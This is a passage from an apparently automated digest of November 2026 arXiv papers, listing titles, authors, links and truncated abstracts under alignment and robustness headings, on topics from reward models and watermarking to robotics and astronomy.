  Reward models (RMs) are increasingly deployed as service components in LLM alignment pipelines, where payment, audit, moderation, and governance workflows act on the scores they return. An inference proof alone does not show whether a score belongs to the intended request, model checkpoint, numerical configuration, and verifier: in a controlled comparison that isolates the accepted statement from prover scale, a generic inference proof wrapped for on-chain checking remains valid after six classe...
  </details>

- **2026-11-11** — Zhenxuan Ding, Yu Huang, Xinmiao Wang et al. — [From a Single RGB Image to Robot Execution: Metric Scene Alignment and Contact-Guided Retargeting](http://arxiv.org/abs/2611.14981v1)
  <details><summary>📄 Abstract</summary>
  Extending humanoid interaction generation to new environments remains limited by the need for prebuilt 3D scene assets. Reconstructing scenes directly from single RGB images offers a way to overcome this limitation, but introduces a key challenge in maintaining geometric consistency throughout motion generation and transfer. Visually plausible human motions may be misaligned with the reconstructed scene, while retargeting can introduce additional support errors due to differences between human a...
  </details>

- **2026-11-11** — Qi Zhang, Bohan Wang, Qianru Sun et al. — [Emergent Vision-Shaped Thinking in Text-Only Reasoning through Multimodal Training](http://arxiv.org/abs/2611.14942v1)
  <details><summary>📄 Abstract</summary>
  Does multimodal training shape how a language model thinks, even when the input is text only? We test this with targeted causal ablations across 10 multimodal configurations from 6 model families, with matched text-only backbones and cross-family transfer controls. We contrast spatial-imagery tasks that invite mental scene construction with symbol-manipulation tasks solvable by symbolic rules alone. We identify a vision-language axis in hidden-state space and ablate its projection at inference. ...
  </details>

- **2026-11-11** — S. Furkan Ozturk, Roger R. Fu, Jose A. P. M. Devienne et al. — [Detrital Remanent Magnetization Analysis at the Particle Scale: Implications for Prebiotic Origins of Homochirality](http://arxiv.org/abs/2611.14905v1)
  <details><summary>📄 Abstract</summary>
  Detrital remanent magnetization (DRM), the alignment of ferromagnetic grains with the geomagnetic field during sedimentation, is the primary mechanism of paleomagnetic remanence acquisition in sedimentary rocks, yet its microphysical mechanism remains contested. Measured DRM intensities consistently fall below theoretical predictions-the long-standing "DRM efficiency gap"-and no single-particle resolving observations have been available to test DRM acquisition models directly. Here we apply quan...
  </details>

- **2026-11-11** — Yinghao Hu, Qian Xiao, Yuting Huang et al. — [Towards Better Legal Reasoning LLMs: Signal Balancing and Reward Scheduling](http://arxiv.org/abs/2611.15346v1)
  <details><summary>📄 Abstract</summary>
  In the legal domain, LLMs can improve reliability and interpretability by generating explicit reasoning traces. However, training LLMs to produce high-quality reasoning traces remains challenging. Existing supervised fine-tuning methods struggle when reasoning traces are significantly longer than final answers, as the learning signal for the answer becomes diluted. Meanwhile, reinforcement learning methods such as Group Relative Policy Optimization also have several limitations, including costly...
  </details>

- **2026-11-10** — Neelam Akula, Varun Shiralkar, Murat Kantarcioglu et al. — [Graph Label Alignment: A Diagnostic Atlas for Graph Classification](http://arxiv.org/abs/2611.14760v1)
  <details><summary>📄 Abstract</summary>
  Graph classification benchmarks vary widely in difficulty: some are solved by simple pooled baselines, while others remain challenging for GNNs and graph transformers. We take a data-centric view and ask whether benchmark success is driven by genuine structure--feature reasoning or by label signal already accessible from restricted marginal views. We introduce graph label alignment, a lightweight diagnostic that measures label accessibility through two supervised probes computed without training...
  </details>

- **2026-11-10** — Haonan Gao, Daeyoung Ham, Yifei Zhang et al. — [Orthogonal Sparse Subgraph Alignment for Structure-Function Coupling in Brain Networks](http://arxiv.org/abs/2611.14663v1)
  <details><summary>📄 Abstract</summary>
  Characterizing the relationship between brain anatomical wiring and functional coordination remains a fundamental challenge in computational neuroscience. This difficulty primarily arises because structure-function coupling in the human brain is spatially heterogeneous, often localized to subnetworks, and inherently difficult to align across disparate representational modalities. We introduce Orthogonal Sparse Subgraph Alignment (OSSA), a principled and interpretable framework designed to identi...
  </details>

- **2026-11-10** — Federico Semenzato, Alvise Raccanelli, Michele Liguori — [ViViViT: a Video-to-Video Vision Transformer for Cosmological Lightcone Reconstruction](http://arxiv.org/abs/2611.14617v1)
  <details><summary>📄 Abstract</summary>
  Moving along the line of sight of a cosmological lightcone also moves through cosmic time, as in a video of cosmic structure traced by an evolving observable. We recast the reconstruction of the underlying matter field from observed lightcones as a video-to-video translation task by introducing ViViViT, a vision transformer that factorizes attention across transverse frames and radial evolution. On reconstructed matter fields from 21cm neutral hydrogen simulations over $z\in[7.66,16.00]$, ViViVi...
  </details>

- **2026-11-10** — Stine Lyngsø Beltoft, Jonas Vistrup, Peter Schneider-Kamp et al. — [Living constitutions: Participatory alignment for sovereign foundation models](http://arxiv.org/abs/2611.13402v1)
  <details><summary>📄 Abstract</summary>
  In Constitutional AI, a plain-text "constitution" encodes values and gets incorporated into a model via post-training. However, the procedure for creating such a constitution poses significant challenges: who contributes, who decides which norms are included, and to what extent must the process be participatory or democratic? These challenges can be paralyzing. Yet, we argue that taking action is essential: without a deliberate constitution, sovereign models would risk misalignment or default to...
  </details>

- **2026-11-10** — Amir Tahmasbi, Keshav Singh, Shaheer Raza et al. — [Demonstration of MANA: Multi-perspective Alignment of NPC Agents](http://arxiv.org/abs/2611.14431v1)
  <details><summary>📄 Abstract</summary>
  We present MANA (Multi-perspective Alignment of NPC Agents), an interactive approach for authoring NPC behavior through embodied demonstration. We show MANA in the context of Minecraft, where a developer aligns NPCs while playing the game itself. Activating MANA lets the developer dynamically switch into the point of view (POV) of any character and demonstrate, in-situ, how it would act given the surrounding context, through both movement and dialogue. MANA then distills each demonstration into ...
  </details>

- **2026-11-10** — Eoin M. Kenny, Salim I. Amoukou, Tom Bewley — [Beyond Proxy Metrics: MLLMs as Human Surrogates for Explainable AI Evaluation](http://arxiv.org/abs/2611.13926v1)
  <details><summary>📄 Abstract</summary>
  Explainable AI (XAI) has expanded into a broad and impactful research area, but the fundamental question of how best to evaluate explanation techniques has proven frustratingly elusive. Methodologies typically revolve around either proxy metrics which tell us little about the utility of an explanation, or human evaluation which---while generally considered the gold standard---is expensive, difficult to scale, and challenging to reproduce. In this paper, we investigate if Multimodal Large Languag...
  </details>

- **2026-11-10** — Fatemeh Mirhosseini, Yasaman S. Sefidgar — [How Well Do Benchmarks Evaluate LLMs' Use for Personal Health Informatics?](http://arxiv.org/abs/2611.13652v1)
  <details><summary>📄 Abstract</summary>
  Benchmarking is a valuable technique for advancing the capabilities of Large Language Models (LLMs), including in personal health informatics. There are growing efforts on benchmark creation for personal health data activities. However, it is unclear whether and how well these efforts align with needs and considerations of personal health informatics process. Addressing this need, we first analyzed 53,587 tasks across eight benchmarks related to personal health informatics and characterized the ...
  </details>

- **2026-11-10** — Basavaraj R M, Aryan Bharat Kumar — [Sanity Checks for Attention Surgery: Null Models and Matched Interventions for Representation-Motivated Design](http://arxiv.org/abs/2611.13543v1)
  <details><summary>📄 Abstract</summary>
  Transformer architectural modifications frequently measure a statistic on internal representations, observe that it is large, remove it architecturally, and report an improvement. Interpreting that sequence requires evaluating whether the statistic exceeds its noise floor, whether it survives a geometric null, and whether the training gain requires the specific direction removed. We formulate these requirements as three reusable checks and apply them to self-attention removal, which deletes the ...
  </details>

- **2026-11-10** — Evan Pačes-Wiles, Bryen Alvarez, Sara Gulabani et al. — [EJAI: Judgment-Preserving Civic AI for Data Center Environmental Justice](http://arxiv.org/abs/2611.13525v1)
  <details><summary>📄 Abstract</summary>
  Communities in the United States and around the world are contesting data centers, the physical infrastructure of AI. These disputes pose environmental justice issues: residents must weigh unevenly distributed burdens using evidence scattered across metrics, corporate claims, policy documents, and public testimony. A formative study with 10 users showed that dashboards and single-agent AI can settle questions before people examine that evidence. Here we present EJAI, a source-grounded system tha...
  </details>

- **2026-11-10** — Chaeho Lee, Junyup Kim, Wansoo Kim et al. — [Leveraging Psychophysical Attentional Distribution for Gaze-Augmented Reward Modeling](http://arxiv.org/abs/2611.13477v1)
  <details><summary>📄 Abstract</summary>
  Integrating human feedback into language models has gained increasing attention as a means to align model outputs with human preferences, with Reinforcement Learning from Human Feedback (RLHF) serving as a prominent framework for preference-based alignment. Recent studies have incorporated eye-tracking (ET) data as an additional supervisory signal for reward model training, grounding reward learning in human reading behavior. Building on this approach, we extend prior fixation-centric models by ...
  </details>

- **2026-11-10** — Paulo Camara — [Inherited Weights: Measuring the Tokenization Premium and the Sovereignty Cost of Language Models for the Global South](http://arxiv.org/abs/2611.13441v1)
  <details><summary>📄 Abstract</summary>
  Most language models deployed outside the United States and China are fine-tuned descendants of a small number of pretrained families. We argue that fine-tuning leaves the decisive properties of a model inherited from its base: vocabulary, knowledge, cultural alignment, memorized data and license. We contribute (i) an updated, reproducible measurement of the tokenization premium across 31 languages and 7 tokenizers released in 2023-2024, on 27 articles of the Universal Declaration of Human Right...
  </details>

- **2026-11-10** — Moein Heidari, Alvin Kimbowa, Mahdi Tabatabaei et al. — [Prompt2Echo (P2Echo): Text-Prompted Multi-View Echocardiography Segmentation with One Model](http://arxiv.org/abs/2611.13425v1)
  <details><summary>📄 Abstract</summary>
  Automated segmentation in multi-view echocardiography is essential for comprehensive cardiac assessment, yet remains challenging due to substantial anatomical and appearance variability across standard acoustic windows. In this paper, we present P2Echo, a unified framework capable of segmenting diverse cardiac structures across multiple standard echocardiographic views using a single model controlled by structured view-aware text prompts. Unlike recent foundation model adaptations that rely on i...
  </details>

- **2026-11-10** — Boyan Han, Xiaoyan Wang, Zhe Sun et al. — [AURA: Auditory Spatial Intelligence via a Unified Representation from a General-Audio Encoder through Complete Alignment](http://arxiv.org/abs/2611.13687v1)
  <details><summary>📄 Abstract</summary>
  Answering spatial questions about multi-source scenes requires a model both to identify each sound and to locate it. Existing spatial audio-language models obtain spatial information from a dedicated encoder, which separates spatial and semantic processing into distinct feature spaces. We study whether a general-audio codec trained without spatial supervision can serve both purposes. A controlled layer-wise analysis shows that the frozen codec retains spatial information, with lateral cues carri...
  </details>

- **2026-11-09** — Carina Jacobson, Aditya Purohit, Srikar Kovvali et al. — [TASCopilot: A provenance-preserving assistant for triple-axis neutron scattering](http://arxiv.org/abs/2611.13374v1)
  <details><summary>📄 Abstract</summary>
  Experimental decisions often depend on evidence scattered across papers, instrument logs, data files, and specialist software. A scientific assistant must connect that evidence without turning a plausible interpretation into an unsupported conclusion. TAS Co-pilot addresses this problem for triple-axis spectroscopy (TAS), which uses neutrons to probe material structure and excitations. It preserves provenance: the sources, processing steps, and review decisions behind each result. Independently ...
  </details>

- **2026-11-09** — Alexandros Hollender, Sonja Kraiczy — [Enforcing Axioms for AI Alignment under Loss-Based Rules](http://arxiv.org/abs/2611.13369v1)
  <details><summary>📄 Abstract</summary>
  Many alignment methods, most notably reinforcement learning from human feedback (RLHF), train reward models by minimizing a loss on pairwise comparisons of model responses. Inspired by principle-guided methods such as Constitutional AI, we treat each principle as a voter that compares responses according to that principle, for example, preferring the more helpful or less toxic response. We represent these voters as linear directions in a fixed embedding space, a simplifying assumption motivated ...
  </details>

- **2026-11-09** — Mufei Li, Nikki Lijing Kuang, Zhuoer Wang et al. — [Which Successes Make Good References? Action-Sequence Alignment for Multi-Turn On-Policy Distillation](http://arxiv.org/abs/2611.13135v1)
  <details><summary>📄 Abstract</summary>
  On-policy distillation (OPD) reduces train-inference distribution mismatch by supervising a student on its own trajectories. For multi-turn tool-use agents, conditioning the teacher on a validated same-task successful trajectory as a reference can provide useful hindsight, but different successes may reach incompatible interaction states and offer misleading supervision. We cast successful-reference selection as a free-target optimal transport problem, which reduces to assigning each failed traj...
  </details>

- **2026-11-09** — Seona Seo, Geonhee Ahn, Hyunsoo Cho et al. — [GRAP: Gender Rubric-Aware Probing for Analyzing Gender Bias in LLMs](http://arxiv.org/abs/2611.13024v1)
  <details><summary>📄 Abstract</summary>
  As LLMs increasingly mediate everyday interactions, subtle gender biases in open-ended responses pose growing societal risks. Existing probing methods have two key limitations: they rely on fixed-format tasks, such as pronoun resolution or occupation association, that alignment-tuned models can easily handle; and they compare raw group-level rubric scores, ignoring per-dimension variance and obscuring which bias dimensions reliably distinguish gender groups. We introduce GRAP (Gender Rubric-Awar...
  </details>

- **2026-11-09** — Francisco M. López, Francisco Cruz — [Can Hindsight Critics Guide Delayed Actors?](http://arxiv.org/abs/2611.11863v2)
  <details><summary>📄 Abstract</summary>
  Sensory delays create temporal misalignments between the state of the environment and the observations available to an agent, turning Markovian control problems into partially observable ones. In this work, we inquire whether such misalignments can be mitigated during training by using hindsight to recover aligned state-action transitions. We introduce Hindsight Critics, an asymmetric extension of the Soft Actor-Critic for reinforcement learning under partial observability. The critics are train...
  </details>

- **2026-11-09** — Huixuan Zhang, Li Lin, Junzhe Zhang et al. — [Direct Trajectory Optimization for Inference-Time Alignment of Text-to-Image Diffusion Models](http://arxiv.org/abs/2611.11821v2)
  <details><summary>📄 Abstract</summary>
  Alignment of text-to-image diffusion models with reward functions is a key challenge in controllable generation. Existing approaches typically rely on optimizing model inputs or fine-tuning denoising networks, which requires computationally expensive backpropagation through large denoising models. In this work, we propose Direct Trajectory Optimization (DTO), a training-free framework that performs alignment by directly optimizing the sampling trajectory of diffusion models. Specifically, DTO tr...
  </details>


### 📂 robustness
*鲁棒性与可靠性 / Robustness & Reliability* — 69 papers

- **2026-11-12** — Daniel Denley, Robert L. Nicol, Mike J. Chantler — [Similar but Not Redundant: Embedding-Gated Refinement for High-Granularity Topic Models](http://arxiv.org/abs/2611.17030v1)
  <details><summary>📄 Abstract</summary>
  High-granularity topic modelling extracts hundreds of niche topics from a corpus, yet this regime is rarely studied and is more commonly framed as a failure mode: "over-clustering," in which coherent themes fragment into redundant subtopics. We argue that this framing conflates genuine redundancy with topics that are semantically similar but meaningfully distinct, and that the central challenge in high-granularity modelling is separating the two. Recent post-hoc refinement methods address topic ...
  </details>

- **2026-11-12** — Yaru Niu, Binghong Chen, Changwei Yao et al. — [EgoX: Egocentric Cross-Embodiment Manipulation with Embodiment Dreaming](http://arxiv.org/abs/2611.16728v1)
  <details><summary>📄 Abstract</summary>
  Generalist manipulation policies can benefit from the complementary experience of humans, real robots, and simulated agents. However, differences in morphology, sensing, and control interfaces make it difficult to learn effectively from their combined demonstrations. We introduce EgoX, an egocentric cross-embodiment learning framework that organizes heterogeneous demonstrations through semantically corresponding observation and action modalities. EgoX pretrains a Modularized Cross-Embodiment Tra...
  </details>

- **2026-11-12** — Robbie Hamilton, Fan Zhang, David Bull — [HiVE-VQA: Hierarchical Interaction via Volumetric Embedding for Video Quality Assessment](http://arxiv.org/abs/2611.17146v1)
  <details><summary>📄 Abstract</summary>
  The proliferation of user-generated video content has made accurate and robust no-reference video quality assessment (NR-VQA) a highly important challenge. Existing research increasingly relies on architecturally complex multi-branch pipelines or computationally intensive fine-tuning of single-branch backbones. In this paper, we investigate whether a single frozen video foundation model can serve as an effective NR-VQA backbone, and propose HiVE-VQA, the first framework (to our knowledge) to app...
  </details>

- **2026-11-12** — Kuancheng Ye — [Prevalence Bounds for Edited Watermarked Text: Power Envelopes and Calibration Sensitivity](http://arxiv.org/abs/2611.17035v1)
  <details><summary>📄 Abstract</summary>
  Watermark detectors decide whether one document came from a watermarked language model. Auditors often need a different number: the share of a corpus that did. We study this share for Gumbel-max and green-list (KGW) watermarks when every document may have been edited by an unknown amount. Without restrictions on the edits, the upper end of the identified set is 1. Combining a known least-favourable next-token distribution with a sequential coupling, we derive a power envelope indexed by three bu...
  </details>

- **2026-11-12** — Jens Lehmann — [Compiling Known Rules into Compact Neural Agents: Weight-Space Programming on Unseen Games](http://arxiv.org/abs/2611.16981v1)
  <details><summary>📄 Abstract</summary>
  Weight-space programming (WSP) uses language models to construct neural network weights without training. We test whether known game mechanics can be compiled into compact agents that generalise to held-out levels, renderings and start states within a game family. Writers receive simulator source with held-out level data removed for 20 privately authored, unpublished ARC-AGI-3-style game families. With a fixed 57k-parameter recurrent architecture, the strongest writer reaches 56% held-out-level ...
  </details>

- **2026-11-12** — Jaemyung Yu, Byeongho Heo, Sangdoo Yun et al. — [Factored One-sided Adam-Moment for Practical and Scalable SOAP](http://arxiv.org/abs/2611.16905v1)
  <details><summary>📄 Abstract</summary>
  Second-order optimizers (e.g., Shampoo, SOAP) have emerged as compelling alternatives to Adam/AdamW and promise faster per-step convergence than AdamW in transformer training. However, they still remain costly in practice, and even SOAP still pays substantial optimizer-state memory and eigendecomposition overhead. We ask whether the benefits of SOAP can be retained at nearly the efficiency of AdamW. In this paper, we answer yes with a lightweight SOAP variant, Factored One-sided Adam-Moment (FOA...
  </details>

- **2026-11-12** — Jarosław Janas, Paweł Morawiecki, Josef Pieprzyk — [Look It Up: Multi-bit LLM Watermarking via Codebook Search](http://arxiv.org/abs/2611.16890v1)
  <details><summary>📄 Abstract</summary>
  Attributing short LLM-generated texts to a specific source remains challenging for existing multi-bit watermarking methods, which often require long generations or costly decoding to recover payloads reliably. We propose a codebook-based watermarking scheme that maps an $n$-bit payload to a longer $u$-bit codeword and embeds it during generation through token-level logit biasing. During extraction, the received bit sequence is matched to the nearest codeword in a precomputed secret codebook usin...
  </details>

- **2026-11-12** — Jieqiang Wei, Fahad Ali, Jonny Reichwald et al. — [ControlHarbor: A Benchmark for Control Design by Coding Agents](http://arxiv.org/abs/2611.16867v1)
  <details><summary>📄 Abstract</summary>
  LLM agents, i.e., language models run by a harness, can now write, run and debug software autonomously. This raises the question of whether they can also carry out control system design. In this paper, we consider control system design as a task for LLM agents and grade the designed controller as control engineers do: the controller is given in a single Python file mapping measurements to actions, evaluated on held-out seeds against an ordered set of requirements, under specified physical pertur...
  </details>

- **2026-11-12** — Aarne Talman, Stergios Chatzikyriakidis — [Shortcuts or Memorisation? Revisiting Data Corruption in Natural Language Understanding with Large Language Models](http://arxiv.org/abs/2611.16843v1)
  <details><summary>📄 Abstract</summary>
  Pre-trained encoders fine-tuned on natural language inference (NLI) and other language understanding tasks keep much of their accuracy after the input is perturbed, e.g. by removing all nouns or shuffling the words. Does the same hold for large language models (LLMs), and if so, is it because they have seen the benchmarks during pre-training? In this paper we revisit these perturbation experiments with eight LLMs alongside fine-tuned encoders on GLUE and the three rounds of ANLI. Regardless of m...
  </details>

- **2026-11-12** — Thomas Beckers, Anthony Bloch, Leonardo Colombo — [Structure-Preserving Learning for Nonlinear Nonholonomic Dynamics](http://arxiv.org/abs/2611.16796v1)
  <details><summary>📄 Abstract</summary>
  Learning the dynamics of mechanical systems subject to nonlinear nonholonomic constraints is challenging, as data-driven models may violate the underlying physical constraints, leading to inconsistent predictions. To address this problem, we develop a constraint-preserving learning framework based on the Lagrange-d'Alembert-Chetaev equations and tangency to the constraint submanifold, which together define an affine space of admissible accelerations. Using the kinetic-energy metric and the Moore...
  </details>

- **2026-11-12** — Shengtao Wu, Zichao Dong, Weixuan Qiao et al. — [From Foundation VLM to Versatile Driving VLM: A Triplet Incremental Training Approach](http://arxiv.org/abs/2611.16727v1)
  <details><summary>📄 Abstract</summary>
  Adapting general Vision-Language Models (VLMs) to Autonomous Driving (AD) is thought to require heavy 3D spatial priors or intrusive architectural overhauls to compensate for a lack of spatial grounding. In this work, we present a counterintuitive pilot study: off-the-shelf general VLMs already exhibit remarkable adaptability across diverse driving tasks, while precise metric depth remains the primary missing link, a bottleneck readily addressable via onboard sensors and depth foundation models....
  </details>

- **2026-11-12** — Afonso Eduardo — [From Data to Wisdom: Rethinking AI Through an Epistemic Lens](http://arxiv.org/abs/2611.16726v1)
  <details><summary>📄 Abstract</summary>
  This paper proposes the Data-to-Wisdom Epistemic Architecture for AI (EAAI), a conceptual framework treating Data, Information, Knowledge, Understanding and Wisdom as five distinct but recursively interacting epistemic functions: observation, contextual interpretation, modeling and prediction, critical evaluation and informed judgment. Two observations motivate it: sequential readings of the Knowledge Pyramid obscure how these functions interact, and a targeted review of ten Bayesian reference b...
  </details>

- **2026-11-12** — Boris Velasevic, Nicolas Lanzetti, Eric Mazumdar — [Strategically Robust Multi-Agent Control](http://arxiv.org/abs/2611.16388v1)
  <details><summary>📄 Abstract</summary>
  A key source of uncertainty in multi-agent systems is the behavior of other agents. Game-theoretic control approaches ignore this uncertainty, while robust control approaches treat others as fully adversarial. In this paper, we introduce strategically robust multi-agent control to populate the spectrum between these two paradigms. Specifically, in dynamic games, we propose that players are strategically robust and seek protection against misspecified control policies of the other players. This f...
  </details>

- **2026-11-12** — You Wu, Guhong Zhang, Hongwei Li et al. — [AstroMemBench: A Benchmark for Memory Systems in Embodied Spacecraft Agents](http://arxiv.org/abs/2611.16590v1)
  <details><summary>📄 Abstract</summary>
  Long-term spacecraft autonomy requires embodied agents to use operational history under communication delays, time-critical operations, environmental uncertainty, complex physical interactions, power and computational constraints, and safety and reliability requirements. We introduce AstroMemBench and a Scenario-Challenge-Capability design method that maps these requirements to executable memory tests. The benchmark covers 16 memory subchallenges through 140 templates and 2240 instances across n...
  </details>

- **2026-11-12** — Subodh Lonkar — [Evidence-Governed Adoption of Self-Generated Updates in Autonomous AI Agents](http://arxiv.org/abs/2611.16378v1)
  <details><summary>📄 Abstract</summary>
  Autonomous agents modify prompts, memories, tools, workflows, and policies using interaction histories. Yet a plausible modification is not necessarily suitable for persistent adoption: candidate selection is adaptive, evaluators may be imperfect, and local gains can hide degradation against an earlier baseline. We introduce Evidence-Governed Evolution (EGE), a framework for governing adoption of self-generated agent modifications. EGE separates candidate generation from confirmatory adoption, e...
  </details>

- **2026-11-12** — Yupeng Tang, Mingfeng Lin — [When Expert Disagreement Hurts: Prestige and Selectivity in LLM Decision Revision](http://arxiv.org/abs/2611.16694v1)
  <details><summary>📄 Abstract</summary>
  When language models revise a decision after another agent disagrees, neither reversal counts nor final accuracy shows whether they are fixing mistakes or abandoning correct answers. We introduce a controlled two-pass audit that holds the question, the evidence, and the model's initial answer fixed and varies only the revision context: neutral reflection, anonymous disagreement, or disagreement attributed to a domain expert. For binary decisions the accounting is exact: revision raises accuracy ...
  </details>

- **2026-11-12** — Ohad Porat, Elad Yom-Tov — [Active Learning of Approximate LLM Ranking for Energy-Efficient Retrieval of Long Queries](http://arxiv.org/abs/2611.16488v1)
  <details><summary>📄 Abstract</summary>
  Search engines and Large Language Models (LLMs) offer complementary strengths for document retrieval: lexical retrievers which rely on keyword matching are fast and energy-efficient, whereas LLMs capture semantic meaning and excel at interpreting long, context-rich queries. However, this comes at a cost that is computationally and energetically prohibitive.   We propose the LLM Active Approximation Model (LAAM), a hybrid retrieval framework that introduces a lightweight learned predictor which s...
  </details>

- **2026-11-12** — Chayan Mondal, Duc-Son Pham, Tele Tan et al. — [TransXplainRRG: A Radiologist-Evaluated LVLM for Chest Radiograph Report Generation](http://arxiv.org/abs/2611.16393v1)
  <details><summary>📄 Abstract</summary>
  Recent advancements in Large Vision-Language Models (LVLM) enhance X-ray report generation, but often neglect clinical context, overlook workflow integration, and lack explainability, which hinders clinical adoption due to interpretability and reliability concerns. This paper addresses the dual challenges of performance and expert explainability in automated X-ray report generation for clinical AI applications. Our proposed approach, TransXplainRRG, utilises an off-the-shelf Swin Transformer mod...
  </details>

- **2026-11-12** — Eiichi Sakurai, Kenji Yamanishi — [Overcoming Spurious Correlations in Conditional Diffusion Models via Doubly Robust Target Correction](http://arxiv.org/abs/2611.16306v1)
  <details><summary>📄 Abstract</summary>
  While conditional diffusion models have achieved remarkable success in generation tasks, they memorize spurious correlations within training data. This causes them to deviate from ideal target distributions. Minimizing a covariate shift-adjusted target risk can address this issue. However, retraining models from scratch for different distributions is computationally prohibitive. To overcome this limitation, we propose DR-Diff, a framework that efficiently fine-tunes pre-trained conditional diffu...
  </details>

- **2026-11-12** — Soma Fumoto, Ryohei Kobayashi, Taiki Watanabe et al. — [Hibikino-Musashi@Home 2026 Team Description Paper](http://arxiv.org/abs/2611.16297v1)
  <details><summary>📄 Abstract</summary>
  This paper presents an overview of the integrated technologies developed for the Open Platform League at RoboCup@Home 2026 in Incheon. A vision system integrated with learning-based, training-free models enables robust object recognition for both known and unknown objects. We introduce a RoomPlan-based method that semi-automatically registers furniture geometry and labels to generate semantic maps. Additionally, a large language model-based planner interprets the instructions recognized by Whisp...
  </details>

- **2026-11-12** — Musheng Li, Jiawei Zhang, Ziyuan Liu et al. — [Rectified Looped Transformer](http://arxiv.org/abs/2611.16265v1)
  <details><summary>📄 Abstract</summary>
  Looped Transformers increase effective depth by repeatedly applying a shared block, offering a parameter-efficient approach to language modeling. However, most existing works directly reuse each loop's output as the next's input, which can lead to hidden-state scale growth and perturbation amplification as recurrence deepens. We propose Rectified Looped Transformer (RLT), which redesigns feedback between loops using an interpolation schedule inspired by flow-based modeling. At each loop, RLT for...
  </details>

- **2026-11-11** — Kaixuan Ji, Quanquan Gu — [A Matching Lower Bound for Online Smooth Calibration](http://arxiv.org/abs/2611.16097v1)
  <details><summary>📄 Abstract</summary>
  We study smooth calibration error in sequential binary prediction, which measures how far a sequence of probabilistic forecasts is from being calibrated and, unlike the classical expected calibration error, is robust to small perturbations of the forecasts. Against adaptive adversaries, the minimax smooth calibration error is known to lie between $Ω(T^{1/3})$ and $O(\sqrt{T})$ (Qiao and Zheng, 2024), where $T$ is the number of rounds. In this paper, we close this gap by constructing a new advers...
  </details>

- **2026-11-11** — Xinyu Zou, Jian Ma, Liang Ma et al. — [A Time-Frequency-Condition Multimodal Fusion Foundation Model for Universal Rotating-Machinery Fault Diagnosis under Multi-Element Heterogeneous Scenarios](http://arxiv.org/abs/2611.15051v1)
  <details><summary>📄 Abstract</summary>
  Intelligent fault diagnosis models are typically developed for a single machine under a specific set of operating conditions, such that each new machine or condition requires retraining from scratch. This one-machine-one-model paradigm scales poorly. Although transfer learning and domain generalization can reduce the labeling burden, they primarily seek domain-invariant commonality, potentially discarding machine-specific characteristics that are critical for diagnosis. This paper proposes TFC-M...
  </details>

- **2026-11-11** — Eduardo de Avila-Armenta, Raúl Alejandro Aquino-Ibarra, Jorge Octavio Nicolás-Díaz et al. — [Before AI Agents Negotiate for Us: A Competitive Tournament of Rule-Based, Search, Optimization, Learned, and Language-Model Negotiators Under Scarcity](http://arxiv.org/abs/2611.15838v1)
  <details><summary>📄 Abstract</summary>
  Automated bilateral negotiation underlies two-sided matching markets such as freight brokering, where many shippers and carriers negotiate price before a matching mechanism decides who is paired with whom. Prior strategy comparisons typically use isolated one-on-one duels or a single fixed market, so they cannot show how a strategy behaves against several live rivals under a changing balance of supply and demand. We built nine negotiation architectures spanning rule-based, search-based, optimiza...
  </details>

- **2026-11-11** — Jiayang Tu, Bozhen Jiang, Bojun Du et al. — [LLM-Enhanced Deep Reinforcement Learning with Human-in-the-Loop Calibration for Real-Time Optimal Power Flow](http://arxiv.org/abs/2611.15003v1)
  <details><summary>📄 Abstract</summary>
  Real-time optimal power flow (RT-OPF) requires fast and reliable decision-making under time-varying operating conditions. However, many practical operating preferences and safety related requirements are difficult to encode using conventional numerical rewards alone, which limits the effectiveness and controllability of deep reinforcement learning (DRL) for RT-OPF. To address this issue, this paper proposes an LLM-enhanced DRL framework with human-in-the-loop (HITL) for RT-OPF. The proposed meth...
  </details>

- **2026-11-11** — Shurun Li, Michael Hua Wang, Haibo Zeng et al. — [Verifier Choice is a Benchmark Design Variable: Auditing Structural Counting Evaluation in Text-to-Image Models](http://arxiv.org/abs/2611.15433v1)
  <details><summary>📄 Abstract</summary>
  Automatic evaluation is now central to text-to-image benchmarking, but the verifier that converts generated images into scores is often treated as an implementation detail. We argue that this is unsafe: an automatic benchmark score is a property of the image generator, prompt distribution, verifier, verifier-use protocol, and scoring rule, not of the generator alone. We study this issue in structural counting, a controlled setting where human-visible counts can be audited. We construct a verifie...
  </details>

- **2026-11-11** — Shuibai Zhang, Junhyuck Kim, Gyeongman Kim et al. — [Is the Importance Ratio Necessary for Stable Reinforcement Learning in LLMs?](http://arxiv.org/abs/2611.15404v1)
  <details><summary>📄 Abstract</summary>
  Reinforcement learning (RL) has become central to post-training large language models (LLMs). However, popular RL methods like GRPO incur non-negligible overhead by computing both old-policy and current-policy likelihoods to form importance sampling ratios. In this work, we propose Likelihood-Gated Policy Optimization (LGPO), which enforces a soft trust region constraint via likelihood-based gating, eliminating the need to compute old-policy likelihoods. Empirically, we show that removing the im...
  </details>

- **2026-11-11** — Quang Qui-Vinh Nguyen, Hung Nguyen, Rang Nguyen et al. — [Where is My Mug? Training-Free Framework for Personalized Image Segmentation](http://arxiv.org/abs/2611.15216v1)
  <details><summary>📄 Abstract</summary>
  \textbf{Personalized Image Segmentation (PIS)} aims to segment the specific object in a target image that matches a user-provided reference. Unlike category-based segmentation or few-shot segmentation, PIS must discriminate between multiple visually similar instances, a requirement central to deployed applications such as augmented reality, personalized content editing, robotics manipulation, inventory tracking, and fine-grained visual retrieval. We show that the strong numbers reported by exist...
  </details>

- **2026-11-11** — Aditya Shukla, Kartik Gupta, Ali Alavi et al. — [Spec-Driven PBT: Deriving Semantic Invariants from Code Specifications for Agentic Property-based Testing](http://arxiv.org/abs/2611.15920v1)
  <details><summary>📄 Abstract</summary>
  Software is increasingly written by AI agents that produce an implementation from a natural language specification, a practice known as agentic coding. Code is now produced faster than it can be reviewed, and has been shown to exhibit its own characteristic failure patterns. Property-based testing (PBT), a long-standing technique in which invariant properties of a program are checked against many generated inputs, has recently been revisited with LLM agents authoring the properties, thereby remo...
  </details>

- **2026-11-11** —  Euclid Collaboration, N. E. P. Lines, P. Holloway et al. — [Euclid Data Release 1 (DR1). Euclid Lens Identification Pipeline and Scientific Exploration (ECLIPSE) A: Strong lens catalogue overview](http://arxiv.org/abs/2611.15883v1)
  <details><summary>📄 Abstract</summary>
  We present 15 072 high-confidence strong lens candidates in Euclid Data Release 1 (DR1), spanning 2000 deg$^2$. These comprise 6073 grade A ('sure lens') and 8999 grade B ('probable lens') systems, which we publish alongside a further 9010 grade C ('possible lens') candidates. With more high-confidence candidates than all previous catalogues combined, this sample establishes a large, homogeneous data set of galaxy-scale strong lenses with high-resolution imaging, transforming strong lensing from...
  </details>

